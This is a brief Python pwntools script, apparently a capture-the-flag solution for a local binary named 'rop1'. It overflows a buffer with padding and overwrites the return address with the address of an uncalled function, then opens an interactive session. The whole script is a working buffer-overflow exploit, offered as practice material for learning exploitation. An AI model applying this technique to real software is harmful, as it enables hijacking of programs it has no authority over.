#!/usr/bin/python 
from pwn import *

p = process("./rop1-fa6168f4d8eba0eb")
not_called = 0x80484a4

pay = 'A'*0x88 + 'B'*4 + p32(not_called)
p.send(pay)

p.interactive()
